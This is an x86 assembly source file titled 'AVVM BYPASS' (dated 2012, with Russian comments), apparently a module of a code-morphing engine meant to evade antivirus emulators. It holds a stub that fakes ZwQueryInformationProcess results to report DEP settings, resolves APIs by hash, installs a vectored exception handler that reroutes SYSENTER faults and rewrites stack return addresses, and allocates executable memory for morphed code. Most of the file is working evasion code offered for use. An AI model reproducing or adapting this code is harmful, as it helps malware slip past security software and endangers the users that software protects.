; AVVM BYPASS
;
; o MI, UM
;
; (с) Indy, 2012
;
; Используем стаб, подобный %APICALL для вызова API. Описываем апи графом, взводим TF и вызываем. 
; Из надстройки проверяем валидность SFC. Для установки TF не используем стандартную связку push 
; EFLAGS_TF|EFLAGS_MASK/popfd и не морфим её, а генерим фолт со специальными параметрами. Парамет
; ры позволяют идентифицировать %AVCALL - определить причину фолта и найти слепок для проверки. В
; о втором




























PSSTUB struct
ProcessHandle	HANDLE ?
InfoClass		ULONG ?
Information	PVOID ?
InfoLength	ULONG ?
ReturnLength	PULONG ?
PSSTUB ends
PPSSTUB typedef ptr PSSTUB

ProcessExecuteFlags	equ 22H

MEM_EXECUTE_OPTION_DISABLE				equ 1 
MEM_EXECUTE_OPTION_ENABLE				equ 2
MEM_EXECUTE_OPTION_DISABLE_THUNK_EMULATION	equ 4
MEM_EXECUTE_OPTION_PERMANENT				equ 8
MEM_EXECUTE_OPTION_EXECUTE_DISPATCH_ENABLE	equ 10H
MEM_EXECUTE_OPTION_IMAGE_DISPATCH_ENABLE	equ 20H

ifdef OPT_ENABLE_DBG_LOG
	$PSStub_CALLED		CHAR "PSStub (", CRLF
	$PSStub_RETURNED1	CHAR "PSStub.1 )", CRLF
	$PSStub_RETURNED2	CHAR "PSStub.2 )", CRLF
endif

; +
; Стаб для обработки ZwQueryInformationProcess().
;
xPSStub:
	%GET_CURRENT_GRAPH_ENTRY
PSStub proc C
	cmp PSSTUB.ProcessHandle[esp + 4],NT_CURRENT_PROCESS
	mov ecx,PSSTUB.Information[esp + 4]
	jne @f
	cmp PSSTUB.InfoClass[esp + 4],ProcessExecuteFlags
	jne @f
	cmp PSSTUB.InfoLength[esp + 4],4
	jne @f
	test ecx,ecx
	mov edx,PSSTUB.ReturnLength[esp + 4]
	jz @f
	mov dword ptr [ecx],40H or MEM_EXECUTE_OPTION_PERMANENT \
		or MEM_EXECUTE_OPTION_ENABLE \
		or MEM_EXECUTE_OPTION_EXECUTE_DISPATCH_ENABLE \
		or MEM_EXECUTE_OPTION_IMAGE_DISPATCH_ENABLE
	.if Edx
		mov dword ptr [edx],4
	.endif
	xor eax,eax
	%DBG $PSStub_RETURNED1
	retn sizeof(PSSTUB)
@@:
	%GETENVPTR
	%DBG $PSStub_RETURNED2
	jmp UENV.pZwQueryInformationProcess[eax]
PSStub endp

XCPT_DISPATCHER_NL	equ 5

NXTINFO struct
pZwQueryInformationProcess	PVOID ?
PsBase					PVOID ?	; OPT.
Result					BOOLEAN ?
NXTINFO ends
PNXTINFO typedef ptr NXTINFO

ifdef OPT_ENABLE_DBG_LOG
	$NxLoadStubsCallback	CHAR "NxLoadStubsCallback.Ip: 0x%X", CRLF
endif

; +
; 
xNxLoadStubsCallback:
	%GET_CURRENT_GRAPH_ENTRY
NxLoadStubsCallback proc uses ebx GpEntry:PVOID, NL:ULONG, List:PVOID, Nx:PNXTINFO
	mov ecx,GpEntry
	mov ebx,Nx
	mov eax,dword ptr [ecx + EhEntryType]
	and al,TYPE_MASK
	cmp al,ENTRY_TYPE_CALL
	jne Exit
	test dword ptr [ecx + EhBranchType],BRANCH_DEFINED_FLAG
	mov eax,dword ptr [ecx + EhBranchAddress]
	jz Exit
	assume ebx:PNXTINFO
	mov edx,[ebx].PsBase
	.if [Ebx].pZwQueryInformationProcess == Eax
		%DBG $NxLoadStubsCallback, dword ptr [ecx + EhAddress]
		mov dword ptr [ecx + EhBranchLink],edx
		.if Edx
			mov eax,dword ptr [edx + EhAddress]
			or dword ptr [ecx + EhDisclosureFlag],DISCLOSURE_CALL_FLAG
		.else
			%GET_GRAPH_ENTRY xPSStub
			and dword ptr [ecx + EhDisclosureFlag],NOT(DISCLOSURE_CALL_FLAG)
		.endif
		mov dword ptr [ecx + EhBranchAddress],eax
		or dword ptr [ecx + EhBranchType],BRANCH_DEFINED_FLAG
		mov [ebx].Result,TRUE
	.endif
Exit:
	xor eax,eax
	ret
NxLoadStubsCallback endp

PcStackBase	equ 4
PcStackLimit	equ 8

ACCESS_TYPE_READ	equ 0
ACCESS_TYPE_WRITE	equ 1

ifdef OPT_ENABLE_DBG_LOG
	$NxVEH_XCPT			CHAR "NxVEH.XCPT: Ip = 0x%X, Code: 0x%X", CRLF
 	$NxVEH_RETURNED		CHAR "NxVEH ) 0x%X", CRLF
	$NxVEH_GETENVPTR		CHAR "NxVEH.GETENVPTR: 0x%X", CRLF
	$NxVEH_EvQueryMemory	CHAR "NxVEH.EvQueryMemory(XcptIp: 0x%X): 0x%X", CRLF
	$NxVEH_EvQuerySysGate	CHAR "NxVEH.EvQuerySysGate(): 0x%X", CRLF
	$NxVEH_ROUTE			CHAR "NxVEH.ROUTE: @Frame = 0x%X", CRLF
endif

; +
; 
; VEH, S-маршрутизация.
;
xNxVEH:
	%GET_CURRENT_GRAPH_ENTRY
NxVEH proc uses ebx esi edi ExceptionPointers:PEXCEPTION_POINTERS
Local GpEntry:PVOID, NLip:ULONG
Local MmInfo:MEMORY_BASIC_INFORMATION
	%GETENVPTR
	%DBG $NxVEH_GETENVPTR, Eax
	mov ecx,ExceptionPointers
	jz Exit	; Chain
	mov edi,EXCEPTION_POINTERS.ExceptionRecord[ecx]
	assume edi:PEXCEPTION_RECORD
	%DBG $NxVEH_XCPT, [edi].ExceptionCode, [edi].ExceptionAddress
	mov esi,ebp
	mov ebx,eax
	assume esi:PSTACK_FRAME
	assume ebx:PUENV
	cmp [edi].ExceptionFlags,0
	jne Route
	cmp [edi].ExceptionCode,STATUS_ILLEGAL_INSTRUCTION
	jne IsGP
Back:
	invoke EvQueryMemory, Ebx, [edi].ExceptionAddress, addr MmInfo
	%DBG $NxVEH_EvQueryMemory, Eax, [edi].ExceptionAddress
	test eax,eax
	jne Route
	cmp MmInfo.State,MEM_COMMIT
	mov ecx,[edi].ExceptionAddress
	jne Route
; Инструкция не должна иметь префиксов. Атрибуты не проверяем. Доступный рамер не 
; проверяем(при доступе к памяти, длиной меньше длины инструкции генерится #AV). 
; Не обязательно инструкция должна располагаться в системном шлюзе.
	cmp byte ptr [ecx],OP_2T
	jne Route
	cmp byte ptr [ecx + 1],OP_SYSENTER
	jne Route
	invoke EvQuerySysGate, Ebx
	%DBG $NxVEH_EvQuerySysGate, Eax
	mov ecx,ExceptionPointers
	test eax,eax
	mov ecx,EXCEPTION_POINTERS.ContextRecord[ecx]
	jz Route
	mov CONTEXT.regEip[ecx],eax
	add CONTEXT.regEdx[ecx],2*4
Load:
	mov eax,EXCEPTION_CONTINUE_EXECUTION
Exit:
	%DBG $NxVEH_RETURNED, Eax
	ret
IsGP:
	cmp [edi].ExceptionCode,STATUS_ACCESS_VIOLATION
	jne Route
; [ExceptionInformation]:
; +0 Access(0:R, 1:W).
; +4 Cr2
	cmp [edi].NumberParameters,2
	jne Route
	cmp [edi].ExceptionInformation,ACCESS_TYPE_READ
	jne Route
	cmp [edi].ExceptionInformation + 4,-1
	jne Route
	jmp Back
Next:
	mov esi,[esi].Next
Route:
	cmp fs:[PcStackBase],esi
	jna Chain
	cmp fs:[PcStackLimit],esi
	ja Chain
	invoke RwCheckIpBelongToSnapshot, [ebx].XcptSnap.RwSnap.GpBase, GCBE_PARSE_NL_UNLIMITED, addr NLip, [esi].Ip, addr GpEntry
	test eax,eax
	mov ecx,GpEntry
	jnz Next
	%DBG $NxVEH_ROUTE, Esi
	test dword ptr [ecx + EhCrossType],CROSS_TYPE_MASK
	.if Zero?
		mov eax,dword ptr [ecx + EhCrossLink]
	.else
		mov ecx,dword ptr [ecx + EhCrossLink]
		and ecx,NOT(TYPE_MASK)	
		mov eax,dword ptr [ecx + EhAddress]
	.endif
	cmp NLip,NULL	; Если !NL, то прекращаем бектрейс - изоляция диспетчера.
	mov [esi].Ip,eax
	jne Next
Chain:
	xor eax,eax
	jmp Exit
NxVEH endp

ifdef OPT_ENABLE_DBG_LOG
	$NxInit_CALLED				CHAR "NxInit ( FLAGS: 0x%X", CRLF
 	$NxInit_RETURNED			CHAR "NxInit ) 0x%X", CRLF
	$NxInit_GETENVPTR			CHAR "NxInit.GETENVPTR: 0x%X", CRLF
	$NxInit_REINIT				CHAR "NxInit.REINIT", CRLF
	$NxInit_EvAllocRw			CHAR "NxInit.EvAlloc.Rw(): 0x%X", CRLF
	$NxInit_EvAllocCs			CHAR "NxInit.EvAlloc.Cs(): 0x%X", CRLF
	$NxInit_EvAllocBd			CHAR "NxInit.EvAlloc.Bd(): 0x%X", CRLF
	$NxInit_GpKitKi			CHAR "NxInit.GpKit.Ki(): 0x%X", CRLF
	$NxInit_GpKitPs			CHAR "NxInit.GpKit.Ps(): 0x%X", CRLF
	$NxInit_GpTrace1			CHAR "NxInit.GpTrace.1(): 0x%X", CRLF
	$NxInit_GpTrace2			CHAR "NxInit.GpTrace.2(): 0x%X", CRLF
	$NxInit_GpBuild			CHAR "NxInit.GpBuildGraph(): 0x%X", CRLF
	$NxInit_ADDVEH_GATE			CHAR "NxInit.ADDVEH(GATE): 0x%X", CRLF
	$NxInit_ADDVEH_NxVEH		CHAR "NxInit.ADDVEH(NxVEH): 0x%X", CRLF
	$NxInit_LdrEncodeEntriesList	CHAR "NxInit.LdrEncodeEntriesList(): 0x%X", CRLF
	$NxInit_NxXcptGen			CHAR "NxInit.NxXcptGen()", CRLF
	$NxInit_EvFreeCs			CHAR "NxInit.EvFreeCs(): 0x%X", CRLF
endif

OP_INT3	equ 0CCH


NxXcptGen proc C
	%DBG $NxInit_NxXcptGen
	assume ebx:PUENV
	TSEHOPT equ FLG_ENABLE_SEH
	FLG_ENABLE_SEH	equ TRUE
	%SEHPROLOG
	BYTE OP_INT3
	%SEHEPILOG
	FLG_ENABLE_SEH equ TSEHOPT
	ret
NxXcptGen endp

NxInit proc uses ebx Flags:DWORD
Local Gp:ULONG
Local Nx:NXTINFO
	%OUT "WARNING: NxInit(VEH BARRIER NOT SUPPORTED)"
	%DBG $NxInit_CALLED, Flags
	%GETENVPTR
	%DBG $NxInit_GETENVPTR, Eax
	jz Error
	mov ebx,eax
	%CPLCF0
	jc Error
	assume ebx:PUENV
	%SPINLOCK [ebx].LockXcpt, InitU, Error
	%DBG $NxInit_REINIT
	jmp Success
InitU:
	push EOL
	push 0815C378DH	; HASH("RtlAddVectoredExceptionHandler")
	push 034DF9700H	; HASH("ZwQueryInformationProcess")
	push 0C5713067H	; HASH("KiUserExceptionDispatcher")
	invoke LdrEncodeEntriesList, NULL, Esp
	%DBG $NxInit_LdrEncodeEntriesList, Eax
	test eax,eax
	jnz ErrLock
	pop [ebx].pKiUserExceptionDispatcher
	pop [ebx].pZwQueryInformationProcess
	pop [ebx].pRtlAddVectoredExceptionHandler
	pop ecx	; EOL
	invoke EvAlloc, 2 * 20H * X86_PAGE_SIZE, 2 * (20H - 1) * X86_PAGE_SIZE, PAGE_READWRITE	; RW
	%DBG $NxInit_EvAllocRw, Eax
	jz ErrLock
	mov [ebx].XcptSnap.RwSnap.GpBase,eax
	mov [ebx].XcptSnap.RwSnap.GpLimit,eax
	xor ecx,ecx
	lea edx,[ebx].XcptSnap.RwSnap.GpLimit
	push ecx
	push ecx
	push ecx
	push ecx
	push ecx
	push XCPT_DISPATCHER_NL
	push GCBE_PARSE_SEPARATE
	push ecx
	push edx
	push [ebx].pKiUserExceptionDispatcher
	Call GpKit
	%DBG $NxInit_GpKitKi, Eax
	test eax,eax
	mov ecx,[ebx].XcptSnap.RwSnap.GpLimit
	jnz RwFree
	test Flags,GCBE_BUILD_LOCAL_DISPATCH
	mov Nx.PsBase,eax
	.if !Zero?
		mov Gp,ecx
		lea edx,Gp
		push eax
		push eax
		push eax
		push eax
		push eax
		push XCPT_DISPATCHER_NL
		push GCBE_PARSE_SEPARATE
		push eax
		push edx
		%GET_GRAPH_ENTRY xPSStub
		mov Nx.PsBase,ecx
		push eax
		Call GpKit
		%DBG $NxInit_GpKitPs, Eax
		test eax,eax
		jnz RwFree
	.endif
	mov ecx,[ebx].pZwQueryInformationProcess
	lea edx,Nx
	mov Nx.Result,FALSE
	mov Nx.pZwQueryInformationProcess,ecx
	%GET_GRAPH_ENTRY xNxLoadStubsCallback
	push edx
	push eax
	push GCBE_PARSE_NL_UNLIMITED
	push [ebx].XcptSnap.RwSnap.GpBase
	Call RwTrace
	%DBG $NxInit_GpTrace1, Eax
	test eax,eax
	jnz RwFree
	cmp Nx.Result,FALSE
	jne @f
	mov eax,STATUS_NOT_FOUND
	jmp RwFree
@@:
; Перед билдом необходимо очистить флаги доступа в графе(взводятся при трассировке нечётным количеством раз). В 
; противном случае после морфа окажется что интегрированная часть графа имеет иные маркеры доступа, что приведёт 
; к #AV при создании перекрёстного графа.
	push NULL
	push NULL
	push GCBE_PARSE_NL_UNLIMITED
	push [ebx].XcptSnap.RwSnap.GpBase
	Call RwTrace
	%DBG $NxInit_GpTrace2, Eax
	test eax,eax
	jnz RwFree
	invoke EvAlloc, 2 * 20H * X86_PAGE_SIZE, 2 * (20H - 1) * X86_PAGE_SIZE, PAGE_READWRITE	; CS
	%DBG $NxInit_EvAllocCs, Eax
	jz RwFree
	mov [ebx].XcptSnap.CsSnap.GpBase,eax
	invoke EvAlloc, 16 * X86_PAGE_SIZE, (16 - 1) * X86_PAGE_SIZE, PAGE_EXECUTE_READWRITE	; BD, < 2p
	%DBG $NxInit_EvAllocBd, Eax
	jz CsFree
	mov [ebx].XcptSnap.BdSnap.GpBase,eax
	push Flags
	push [ebx].XcptSnap.BdSnap.GpBase
	push [ebx].XcptSnap.CsSnap.GpBase
	push [ebx].XcptSnap.RwSnap.GpLimit
	push [ebx].XcptSnap.RwSnap.GpBase
	Call GpBuildGraph
	%DBG $NxInit_GpBuild, Eax
	test eax,eax
	jnz BdFree
	test Flags,GCBE_BUILD_CROSS_UNLINK
	mov [ebx].XcptIp,eax
	.if !Zero?
; Маршрутизация через Rw-граф. Перекрёстный не используем.
		invoke EvFree, [ebx].XcptSnap.CsSnap.GpBase
		%DBG $NxInit_EvFreeCs, Eax
		mov [ebx].XcptSnap.CsSnap.GpBase,NULL
	.endif
	push [ebx].ApiStub.Gate
	push TRUE
	%APICALL [ebx].pRtlAddVectoredExceptionHandler, 2
	%DBG $NxInit_ADDVEH_GATE, Eax
	test eax,eax
	jnz Added
NoGate:
	%GET_GRAPH_ENTRY xNxVEH
	push eax
	push TRUE
	%APICALL [ebx].pRtlAddVectoredExceptionHandler, 2
	%DBG $NxInit_ADDVEH_NxVEH, Eax
	.if !Eax
		mov eax,STATUS_UNSUCCESSFUL
		jmp BdFree
	.endif
Added:
	mov [ebx].VEH,eax
	%UNLOCK [ebx].LockXcpt,LOCK_INIT
	invoke NxXcptGen
Success:
	xor eax,eax
Exit:
	%DBG $NxInit_RETURNED, Eax
	ret
BdFree:
	push eax
	invoke EvFree, [Ebx].XcptSnap.BdSnap.GpBase
	pop eax
CsFree:
	push eax
	invoke EvFree, [Ebx].XcptSnap.CsSnap.GpBase
	pop eax
RwFree:
	push eax
	invoke EvFree, [Ebx].XcptSnap.RwSnap.GpBase
	pop eax
ErrLock:
	%UNLOCK [ebx].LockXcpt,LOCK_FAIL
Error:
	mov eax,STATUS_UNSUCCESSFUL
	jmp Exit
NxInit endp